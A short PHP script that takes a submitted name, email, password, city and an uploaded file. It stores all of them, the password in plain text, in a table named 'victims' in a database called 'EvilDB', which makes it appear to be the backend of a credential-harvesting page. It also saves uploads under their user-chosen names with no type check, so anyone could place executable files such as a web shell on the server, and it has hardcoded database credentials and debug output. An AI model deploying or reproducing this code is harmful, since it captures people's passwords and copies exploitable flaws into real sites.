<?php

ini_set('display_errors',1);
ini_set('display_startup_erros',1);
error_reporting(E_ALL);

$nome = $_POST['nome'];
$sobre = $_POST['sobrenome'];
$email = $_POST['mail'];
$senha = $_POST['pass'];
$cidade = $_POST['city'];

$con = new PDO(
	"mysql:host=localhost;dbname=EvilDB",
	"Tennebris",
	"password"
);

$uploaddir = '../site/imagens/';
$uploadfile = $uploaddir . basename($_FILES['userfile']['name']);

echo '<pre>';
if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile)) {
    echo "Arquivo válido e enviado com sucesso.\n";
} else {
    echo "Possível ataque de upload de arquivo!\n";
}

echo 'Aqui está mais informações de debug:';
print_r($_FILES);

print "</pre>";

$query = $con->prepare("INSERT INTO victims(nome,sobre,image,email,senha,cidade) VALUES(:nome, :sobre, :image,:email,:senha,:cidade)");
$query->bindValue(':nome',$nome);
$query->bindValue(':sobre',$sobre);
$query->bindValue(':email',$email);
$query->bindValue(':image',$uploadfile);
$query->bindValue(':senha',$senha);
$query->bindValue(':cidade',$cidade);
$query->execute();
?>